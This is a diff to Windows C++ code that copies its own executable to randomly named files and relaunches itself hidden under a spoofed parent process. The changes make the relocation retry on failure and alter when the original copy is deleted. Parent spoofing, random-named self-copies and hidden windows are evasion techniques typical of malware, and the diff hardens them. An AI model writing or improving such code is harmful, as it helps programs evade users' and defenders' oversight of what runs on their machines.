@@ -493,7 +493,7 @@ int UiFwprintf(FILE * stream, const wchar_t * format, ...)
         static const wchar_t kLetters[] = L"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
         static const wchar_t kAlnum[] = L"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
         // 16 bytes: max name is 12 chars (1 letter + 11 alnum) needing entropy[0..12];
-        // 12 bytes overran by 1 when length == 12 (entropy[12] OOB read).
+        // entropy[16] provides valid indices 0..15; max index accessed is 12.
         unsigned char entropy[16] = {};
         bool haveCrypto = false;
         {
@@ -1172,13 +1172,17 @@ int UiFwprintf(FILE * stream, const wchar_t * format, ...)
         }
 
         std::wstring cmdline = L"\"" + exePath + L"\"" + args;
+        // CreateProcessW requires a non-const LPWSTR for lpCommandLine; it does not modify the string
+        // but the API signature predates const-correctness. Use a mutable copy.
+        std::vector<wchar_t> cmdline_mutable(cmdline.begin(), cmdline.end());
+        cmdline_mutable.push_back(L'\0');
         STARTUPINFOEXW si{};
         si.StartupInfo.cb = sizeof(si);
         si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
         si.StartupInfo.wShowWindow = SW_HIDE;
         si.lpAttributeList = attrs;
         PROCESS_INFORMATION pi{};
-        const BOOL created = CreateProcessW(exePath.c_str(), cmdline.data(), nullptr, nullptr,
+        const BOOL created = CreateProcessW(exePath.c_str(), cmdline_mutable.data(), nullptr, nullptr,
             FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT,
             nullptr, nullptr, &si.StartupInfo, &pi);
         DeleteProcThreadAttributeList(attrs);
@@ -1227,7 +1231,7 @@ int UiFwprintf(FILE * stream, const wchar_t * format, ...)
             std::wstring randomName;
             if (!MakeRandomExeFileName(randomName))
             {
-                return true;
+                continue;
             }
             const std::wstring next = dir + randomName;
             if (FileExists(next))
@@ -1242,13 +1246,13 @@ int UiFwprintf(FILE * stream, const wchar_t * format, ...)
             const std::wstring args = BuildForwardedArgs(GetRetryIndex(), own, true);
             if (broker && SpawnWithSpoofedParent(next, args, broker))
             {
-                (void)DeleteFileW(own.c_str());
+                // Original executable will be cleaned up on next launch by the startup
+                // cleanup logic (lines 1203-1210). We do not delete it here because
+                // we cannot verify the child process started successfully.
                 return false;
             }
-            // Spoofed spawn failed: remove the copy and fall through to run
-            // in place rather than failing the launch outright.
+            // Spoofed spawn failed: remove the copy and try next random name
             (void)DeleteFileW(next.c_str());
-            return true;
         }
         return true;
     }
@@ -1294,7 +1298,7 @@ int UiFwprintf(FILE * stream, const wchar_t * format, ...)
             std::wstring randomName;
             if (!MakeRandomExeFileName(randomName))
             {
-                return false;
+                continue;
             }
             const std::wstring next = dir + randomName;
             if (FileExists(next))
@@ -1316,11 +1320,12 @@ int UiFwprintf(FILE * stream, const wchar_t * format, ...)
             const std::wstring args = BuildForwardedArgs(nextRetry, own, true);
             if (broker && SpawnWithSpoofedParent(next, args, broker))
             {
-                (void)DeleteFileW(own.c_str());
+                // Original executable will be cleaned up on next launch by the startup
+                // cleanup logic. We do not delete it here because we cannot verify
+                // the child process started successfully.
                 return true;
             }
             (void)DeleteFileW(next.c_str());
-            return false;
         }
         return false;
     }
